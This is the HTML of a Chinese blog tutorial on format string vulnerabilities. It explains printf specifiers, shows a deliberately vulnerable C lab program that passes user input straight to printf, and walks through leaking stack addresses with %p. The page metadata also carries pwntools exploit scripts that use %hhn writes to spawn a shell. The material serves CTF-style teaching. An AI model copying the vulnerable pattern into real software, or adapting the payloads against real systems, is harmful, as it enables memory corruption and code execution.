@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>格式化字符串漏洞基础 | 果汁天下苏&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="格式化字符串漏洞 格式化字符串漏洞是发现比较晚的漏洞，产生的原因是因为 ，格式化函数把用户输入的格式化字符，当做了解析自身的格式化字符做了解析。 常见的格式化漏洞函数 各种print函数 格式化字符 %s 打印字符串 %p 打印地址 %c 打印char字符 %n 输入字符 %10c 这代表10个制表符（空格） printf(&#34;guozhi%10s&#34;, &#34;格">
+<meta name="author" content="果汁天下苏">
+<link rel="canonical" href="http://guozhi1.github.io/posts/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.css" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.js" onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="http://guozhi1.github.io/img/Q.gif">
+<link rel="icon" type="image/png" sizes="16x16" href="http://guozhi1.github.io/img/Q.gif">
+<link rel="icon" type="image/png" sizes="32x32" href="http://guozhi1.github.io/img/Q.gif">
+<link rel="apple-touch-icon" href="http://guozhi1.github.io/img/Q.gif">
+<link rel="mask-icon" href="http://guozhi1.github.io/img/Q.gif">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+<script defer src="https://unpkg.com/mermaid@8.8.1/dist/mermaid.min.js"></script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.3/dist/jquery.min.js"></script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = ""; 
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<meta property="og:title" content="格式化字符串漏洞基础" />
+<meta property="og:description" content="格式化字符串漏洞 格式化字符串漏洞是发现比较晚的漏洞，产生的原因是因为 ，格式化函数把用户输入的格式化字符，当做了解析自身的格式化字符做了解析。 常见的格式化漏洞函数 各种print函数 格式化字符 %s 打印字符串 %p 打印地址 %c 打印char字符 %n 输入字符 %10c 这代表10个制表符（空格） printf(&#34;guozhi%10s&#34;, &#34;格" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://guozhi1.github.io/posts/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-07T15:35:44+08:00" />
+<meta property="article:modified_time" content="2023-12-07T15:35:44+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="格式化字符串漏洞基础"/>
+<meta name="twitter:description" content="格式化字符串漏洞 格式化字符串漏洞是发现比较晚的漏洞，产生的原因是因为 ，格式化函数把用户输入的格式化字符，当做了解析自身的格式化字符做了解析。 常见的格式化漏洞函数 各种print函数 格式化字符 %s 打印字符串 %p 打印地址 %c 打印char字符 %n 输入字符 %10c 这代表10个制表符（空格） printf(&#34;guozhi%10s&#34;, &#34;格"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+
+        {
+          "@type": "ListItem",
+          "position":  2 ,
+          "name": "📚文章",
+          "item": "http://guozhi1.github.io/posts/"
+        },
+
+        {
+          "@type": "ListItem",
+          "position":  3 ,
+          "name": "🏖 pwn",
+          "item": "http://guozhi1.github.io/posts/pwn/"
+        }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "格式化字符串漏洞基础",
+      "item": "http://guozhi1.github.io/posts/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "格式化字符串漏洞基础",
+  "name": "格式化字符串漏洞基础",
+  "description": "格式化字符串漏洞 格式化字符串漏洞是发现比较晚的漏洞，产生的原因是因为 ，格式化函数把用户输入的格式化字符，当做了解析自身的格式化字符做了解析。 常见的格式化漏洞函数 各种print函数 格式化字符 %s 打印字符串 %p 打印地址 %c 打印char字符 %n 输入字符 %10c 这代表10个制表符（空格） printf(\u0026#34;guozhi%10s\u0026#34;, \u0026#34;格",
+  "keywords": [
+    ""
+  ],
+  "articleBody": "格式化字符串漏洞 格式化字符串漏洞是发现比较晚的漏洞，产生的原因是因为 ，格式化函数把用户输入的格式化字符，当做了解析自身的格式化字符做了解析。\n常见的格式化漏洞函数 各种print函数\n格式化字符 %s 打印字符串 %p 打印地址 %c 打印char字符 %n 输入字符\n%10c 这代表10个制表符（空格）\nprintf(\"guozhi%10s\", \"格式化字符\") guozhi 格式化字符 %2$s 这个代表占位符\nprintf(\"%2$s guozhi %1$s\", \"第一个参数\", \" 第二个参数\"); 输出： 第二个参数 guozhi 第一个参数 这就产生了一个问题如果参数不足的情况下 %3$会输出什么？\n会，接着往下输出如果是x86则会输出栈上的内容， 如果是x64会先泄露前六个寄存器的内容然后再泄露栈上的内容，这就会造成栈内存泄露。\n当然泄露栈内存空间不会有太大危害， 需要配合另一个格式化字符串进行写入操作。\n%n 往里写东西不过写入的地址必须是被指向的如\n01:0004│-054 0xffffd0b4 —▸ 0xffffd0e8 ◂— 0x61616161 ('aaaa') 这样的指针就可以进行修改 %100c%x$n x代表它的栈上的第几个，需要通过计算获得。\n如何没有指向我们想修改的的地址怎么办？\n可以通过写入地址的方式把想要修改的地址写进去但是， 如果是x86可以把地址写在前面(0xffffd0e8%96c%x$n地址再前面注意内存对齐), 但是x64就不行因为高地址是00读到00就会被截断所以地址要放到后面(%100c%x$n0x7fffffffdf10)\n如果修改成功\n01:0004│-054 0xffffd0b4 —▸ 0xffffd0e8 ◂— 0x64 /* 'd' */ 代码分析 #include #include #include int test1; int init_func(){ setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); return 0; } int dofunc(){ char buf1[0x10]; char buf2[0x10]; char buf3[0x10]; int test2=0; int test3=0; while(1){ puts(\"input:\"); read(0,buf1,0x100); printf(buf1); if(test3==100) system(\"/bin/sh\"); } return 0; } int main(){ init_func(); dofunc(); return 0; } //gcc fmt_test_2.c -o fmt_test_2_x64 //gcc -m32 fmt_test_2.c -o fmt_test_2_x86 这个题需要test3 == 100 会触发system 函数， 但是test3的变量被写死再代码里无法进行修改。 但是上方有一个printf函数临近我们可以通过printf 函数向栈中写test3地址的内容。\n首先确定获取到栈底ebp的地址然后通过偏移来寻test3的地址\nebp是\nEBP 0xffffd108 —▸ 0xffffd118 ◂— 0x0 EBP是0xffffd108 然后通过%p来寻址看看偏移是多少\n%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p 这样就可以判断看出第几个偏移是栈底了\n0xffffd0e8,0x100,0x56556246,0xf7faf224,0x56559000,0xf7fb1000,0xf7fb1000,0xffffd108,0xf7fe7ae4,0xffffd144,0x56559000,0xf7fb1000,0xf7fb1000,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70 第8个偏移就是栈底了也就是%8$p\n然后是确定test3的栈地址。\n先查看是什么汇编\n0x56556291 cmp dword ptr [ebp - 0x10], 0x64 是ebp-0x10就是test的栈偏移了，哪就可以用上面得到栈ebp的地址0x10得到test3的偏移，通过%n写入100即可完成。\n如何计算出%n的偏移？\n可以通过aaaa%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p 看0x61616161再哪出现，第几个就是多少偏移。\nEXP from pwn import * r = process(\"fmt_test_2_x86\") raw_input() r.recvline(\"input:\") r.send(\"%8$p\") ebp_addr = int(r.recv()[2:10],16) print(ebp_addr) #r.recvline(\"input:\") test3_addr = ebp_addr - 0x10 payload = p32(test3_addr) + b\"%96c%14$hhn\" print(\"ebp_addr is:\"+hex(ebp_addr)) print(\"test3_addr is:\"+hex(test3_addr)) r.send(payload) r.interactive() x64EXP x64需要注意\n算上寄存器的空间 地址写在后面 from pwn import * r = process(\"fmt_test_2_x64\") raw_input() r.recvline(\"input:\") r.send(\"%9$p\") ebp_addr = int(r.recv()[2:14],16) print(\"ebp_addr is:\",hex(ebp_addr)) test3_addr = ebp_addr - 0x8 print(\"test3_addr is:\",hex(test3_addr)) r.recvline(\"input:\") payload = \"%100c%12$hhnaaaa\"+p64(test3_addr) r.send(payload) r.interactive() ",
+  "wordCount" : "1133",
+  "inLanguage": "en",
+  "datePublished": "2023-12-07T15:35:44+08:00",
+  "dateModified": "2023-12-07T15:35:44+08:00",
+  "author":[{
+    "@type": "Person",
+    "name": "果汁天下苏"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://guozhi1.github.io/posts/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "果汁天下苏's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://guozhi1.github.io/img/Q.gif"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    (function () {
+        let  arr,reg = new RegExp("(^| )"+"change-themes"+"=([^;]*)(;|$)");
+        if(arr = document.cookie.match(reg)) {
+        } else {
+            if (new Date().getHours() >= 19 || new Date().getHours() < 6) {
+                document.body.classList.add('dark');
+                localStorage.setItem("pref-theme", 'dark');
+            } else {
+                document.body.classList.remove('dark');
+                localStorage.setItem("pref-theme", 'light');
+            }
+        }
+    })()
+
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://guozhi1.github.io" accesskey="h" title="果汁天下苏 (Alt + H)">
+            <img src="http://guozhi1.github.io/img/Q.gif" alt="logo" aria-label="logo"
+                 height="35">果汁天下苏</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                         stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                         stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://guozhi1.github.io/search" title="🔍 搜索 (Alt &#43; /)" accesskey=/>
+                <span>🔍 搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://guozhi1.github.io/" title="🏠 主页">
+                <span>🏠 主页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://guozhi1.github.io/posts" title="📚 文章">
+                <span>📚 文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://guozhi1.github.io/tags" title="🧩 标签">
+                <span>🧩 标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://guozhi1.github.io/archives/" title="⏱️ 时间轴">
+                <span>⏱️ 时间轴</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://guozhi1.github.io/about" title="🙋🏻‍♂️ 关于">
+                <span>🙋🏻‍♂️ 关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://guozhi1.github.io/links" title="🤝 友链">
+                <span>🤝 友链</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main page">
+<style>
+    i[id*="post_meta_style"] {
+        display: flex;
+        align-items: center;
+        margin: 0 0 10px 0;
+    }
+</style>
+
+<article class="post-single">
+    <div id="single-content">
+        <header class="post-header">
+            <div class="breadcrumbs"><a href="http://guozhi1.github.io">🏠 主页</a>&nbsp;»&nbsp;<a href="http://guozhi1.github.io/posts/">📚文章</a>&nbsp;»&nbsp;<a href="http://guozhi1.github.io/posts/pwn/">🏖 pwn</a></div>
+            <h1 class="post-title">
+                格式化字符串漏洞基础
+            </h1>
+            <div class="post-meta">
+
+<style>
+    i[id*="post_meta_style"] {
+        display: flex;
+        align-items: center;
+        margin: 0 0 10px 0;
+    }
+
+    .parent-post-meta {
+        display: flex;
+        flex-wrap: wrap;
+        opacity: 0.8;
+    }
+</style>
+
+<span class="parent-post-meta">
+    <span id="post_meta_style_1">
+        <span class="fa fa-calendar-check-o"></span>
+        <span>2023-12-07
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    
+    
+    
+    
+    
+    
+    
+    <span id="post_meta_style_3">
+        <span class="fa fa-file-word-o"></span>
+        <span>1133字
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    <span id="post_meta_style_4">
+        <span class="fa fa-clock-o"></span>
+        <span>3分钟
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    <span id="post_meta_style_5">
+        <span class="fa fa-user-o"></span>
+        <span>果汁天下苏
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    <span id="post_meta_style_6">
+        <span class="fa fa-tags" style="opacity: 0.8"></span>
+        <span>
+            <span class="post-tags-meta">
+                <a href="http://guozhi1.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" style="color: var(--secondary)!important;">格式化字符串漏洞</a>
+                &nbsp;<a href="http://guozhi1.github.io/tags/pwn/" style="color: var(--secondary)!important;">pwn</a>
+                &nbsp;<a href="http://guozhi1.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/" style="color: var(--secondary)!important;">二进制漏洞</a>
+                &nbsp;<a href="http://guozhi1.github.io/tags/%E5%9F%BA%E7%A1%80/" style="color: var(--secondary)!important;">基础</a>
+            </span>
+        </span>
+    </span>
+</span>
+<span style="opacity: 0.8;">
+                    <span id="post_meta_style_7">
+                        &nbsp;&nbsp;
+                        <span class="fa fa-eye" ></span>
+                        <span>
+                            <span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span></span>
+                            &nbsp;&nbsp;
+                        </span>
+                    </span>
+                    <span id="post_meta_style_8">
+                        <span class="fa fa-commenting-o"></span>
+                        <span>
+                            <script src="https://cdn.staticfile.org/twikoo/1.5.8/twikoo.all.min.js"></script>
+                            <script>
+                                let url = document.documentURI
+                                
+                                let dnsUrl = "http://guozhi1.github.io"
+                                let urlSplit = url.split(dnsUrl)
+                                let finalUrl = urlSplit[1]
+                                if (finalUrl[0] !== '/') {
+                                    finalUrl = '/'+finalUrl
+                                }
+                                twikoo.getCommentsCount({
+                                    envId:  null , 
+                                region:  null , 
+                                urls: [ 
+                                    
+                                    finalUrl,
+                                ],
+                                    includeReply: false 
+                                }).then(function (res) {
+                                    let count = res[0].count
+                                    const obj = document.getElementById("comment_count");
+                                    obj.innerText = count
+                                    
+                                    
+                                    
+                                }).catch(function (err) {
+                                    
+                                    console.error(err);
+                                });
+                            </script>
+                            <span id="comment_count"></span>
+                        </span>
+                    </span>
+                </span>
+
+</div>
+        </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">文章目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%bc%8f%e6%b4%9e" aria-label="格式化字符串漏洞">格式化字符串漏洞</a></li>
+                <li>
+                    <a href="#%e5%b8%b8%e8%a7%81%e7%9a%84%e6%a0%bc%e5%bc%8f%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%87%bd%e6%95%b0" aria-label="常见的格式化漏洞函数">常见的格式化漏洞函数</a><ul>
+                        
+                <li>
+                    <a href="#%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6" aria-label="格式化字符">格式化字符</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90" aria-label="代码分析">代码分析</a></li>
+                <li>
+                    <a href="#exp" aria-label="EXP">EXP</a></li>
+                <li>
+                    <a href="#x64exp" aria-label="x64EXP">x64EXP</a>
+                </li>
+            </ul>
+        </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    window.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        
+        activeElement = elements[0];
+        const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+        document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+    }, false);
+
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+
+    window.addEventListener('scroll', () => {
+        
+        activeElement = Array.from(elements).find((element) => {
+            if ((getOffsetTop(element) - window.pageYOffset) > 0 &&
+                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
+                return element;
+            }
+        }) || activeElement
+
+        elements.forEach(element => {
+            const id = encodeURI(element.getAttribute('id')).toLowerCase();
+            if (element === activeElement){
+                document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+            } else {
+                document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
+            }
+        })
+    }, false);
+
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;
+    }
+</script>
+        <div class="post-content"><h3 id="格式化字符串漏洞">格式化字符串漏洞<a hidden class="anchor" aria-hidden="true" href="#格式化字符串漏洞">#</a></h3>
+<p>格式化字符串漏洞是发现比较晚的漏洞，产生的原因是因为 ，格式化函数把用户输入的格式化字符，当做了解析自身的格式化字符做了解析。</p>
+<h3 id="常见的格式化漏洞函数">常见的格式化漏洞函数<a hidden class="anchor" aria-hidden="true" href="#常见的格式化漏洞函数">#</a></h3>
+<p>各种print函数</p>
+<h4 id="格式化字符">格式化字符<a hidden class="anchor" aria-hidden="true" href="#格式化字符">#</a></h4>
+<p>%s 打印字符串
+%p 打印地址
+%c 打印char字符
+%n 输入字符</p>
+<p>%10c 这代表10个制表符（空格）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>printf(&#34;guozhi%10s&#34;, &#34;格式化字符&#34;)
+</span></span><span style="display:flex;"><span>guozhi           格式化字符
+</span></span></code></pre></div><p>%2$s 这个代表占位符</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>printf(&#34;%2$s guozhi %1$s&#34;, &#34;第一个参数&#34;, &#34; 第二个参数&#34;);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>输出：
+</span></span><span style="display:flex;"><span>第二个参数 guozhi 第一个参数
+</span></span></code></pre></div><p>这就产生了一个问题如果参数不足的情况下 %3$会输出什么？</p>
+<blockquote>
+<p>会，接着往下输出如果是x86则会输出栈上的内容， 如果是x64会先泄露前六个寄存器的内容然后再泄露栈上的内容，这就会造成栈内存泄露。</p>
+</blockquote>
+<p>当然泄露栈内存空间不会有太大危害， 需要配合另一个格式化字符串进行写入操作。</p>
+<p>%n 往里写东西不过写入的地址必须是被指向的如</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>01:0004│-054     0xffffd0b4 —▸ 0xffffd0e8 ◂— 0x61616161 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;aaaa&#39;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>这样的指针就可以进行修改
+<code>%100c%x$n</code> x代表它的栈上的第几个，需要通过计算获得。<br>
+如何没有指向我们想修改的的地址怎么办？</p>
+<blockquote>
+<p>可以通过写入地址的方式把想要修改的地址写进去但是， 如果是x86可以把地址写在前面(<code>0xffffd0e8%96c%x$n</code>地址再前面注意内存对齐), 但是x64就不行因为高地址是00读到00就会被截断所以地址要放到后面(<code>%100c%x$n0x7fffffffdf10</code>)</p>
+</blockquote>
+<p>如果修改成功</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>01:0004│-054     0xffffd0b4 —▸ 0xffffd0e8 ◂— 0x64 /* <span style="color:#e6db74">&#39;d&#39;</span> */ 
+</span></span></code></pre></div><h3 id="代码分析">代码分析<a hidden class="anchor" aria-hidden="true" href="#代码分析">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> test1;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">init_func</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setvbuf</span>(stdin,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setvbuf</span>(stdout,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setvbuf</span>(stderr,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">dofunc</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf1[<span style="color:#ae81ff">0x10</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf2[<span style="color:#ae81ff">0x10</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf3[<span style="color:#ae81ff">0x10</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> test2<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> test3<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;input:&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,buf1,<span style="color:#ae81ff">0x100</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(buf1);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(test3<span style="color:#f92672">==</span><span style="color:#ae81ff">100</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);        
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">init_func</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dofunc</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//gcc fmt_test_2.c  -o fmt_test_2_x64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//gcc -m32 fmt_test_2.c -o fmt_test_2_x86
+</span></span></span></code></pre></div><p>这个题需要test3 == 100 会触发system 函数，
+但是test3的变量被写死再代码里无法进行修改。 但是上方有一个printf函数临近我们可以通过printf
+函数向栈中写test3地址的内容。</p>
+<p>首先确定获取到栈底ebp的地址然后通过偏移来寻test3的地址</p>
+<p>ebp是</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> EBP  0xffffd108 —▸ 0xffffd118 ◂— 0x0 
+</span></span></code></pre></div><p>EBP是<code>0xffffd108</code>
+然后通过%p来寻址看看偏移是多少</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
+</span></span></code></pre></div><p>这样就可以判断看出第几个偏移是栈底了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0xffffd0e8,0x100,0x56556246,0xf7faf224,0x56559000,0xf7fb1000,0xf7fb1000,0xffffd108,0xf7fe7ae4,0xffffd144,0x56559000,0xf7fb1000,0xf7fb1000,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70
